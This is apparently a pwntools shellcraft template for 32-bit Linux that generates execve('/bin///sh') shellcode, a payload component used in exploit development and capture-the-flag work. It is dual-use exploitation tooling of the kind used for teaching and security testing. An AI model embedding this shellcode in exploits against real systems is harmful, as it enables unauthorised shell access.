<% from pwnlib.shellcraft import i386 %>
<% from pwnlib.constants.linux.i386 import SYS_execve %>
<%docstring>Execute /bin/sh</%docstring>

${i386.pushstr('/bin///sh')}

${i386.linux.syscall('SYS_execve', 'esp', 0, 0)}
